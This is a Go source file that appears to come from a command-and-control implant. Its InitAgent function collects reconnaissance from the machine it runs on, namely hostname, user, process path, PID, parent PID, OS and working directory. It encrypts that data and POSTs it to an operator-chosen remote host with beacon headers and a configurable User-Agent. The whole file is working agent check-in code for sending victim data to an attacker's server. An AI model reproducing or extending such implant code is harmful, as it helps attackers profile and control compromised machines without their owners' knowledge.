package initialization

import (
	"bytes"
	"encoding/json"
	"net/http"

	hg "github.com/deranged0tter/hellsgopher"
)

func InitAgent(rhost string, rport string, uri string, sleep int, jitter int, listener string, agentid string, useragent string, key []byte, beacon_name string) error {
	url := "http://" + rhost + ":" + rport + "/" + uri

	hostname, err := hg.GetHostname()
	if err != nil {
		return err
	}

	procPath, err := hg.GetCurrentProcPath()
	if err != nil {
		return err
	}

	procName, err := hg.GetCurrentProcName()
	if err != nil {
		return err
	}

	pid := hg.GetCurrentPid()
	ppid := hg.GetCurrentPpid()

	os := hg.GetOS()

	username, err := hg.GetCurrentUsername()
	if err != nil {
		return err
	}

	pwd, err := hg.GetPwd()
	if err != nil {
		return err
	}

	rawJsonData := httpPostInitRequest{
		Hostname:        hostname,
		ProcessPath:     procPath,
		PWD:             pwd,
		ProcessName:     procName,
		ProcessID:       pid,
		ParentProcessID: ppid,
		ProcessUser:     username,
		OperatingSystem: os,
		Sleep:           sleep,
		Jitter:          jitter,
		Listener:        listener,
	}

	jsonData, err := json.Marshal(rawJsonData)
	if err != nil {
		return err
	}

	jsonDataEncrypted, err := hg.EncryptBytes(jsonData, key)
	if err != nil {
		return err
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonDataEncrypted)))
	if err != nil {
		return err
	}
	req.Header.Add("AgentID", agentid)
	req.Header.Add("CallType", "Init")
	req.Header.Set("User-Agent", useragent)
	req.Header.Add("Name", beacon_name)

	_, err = client.Do(req)
	if err != nil {
		return err
	}

	return nil
}
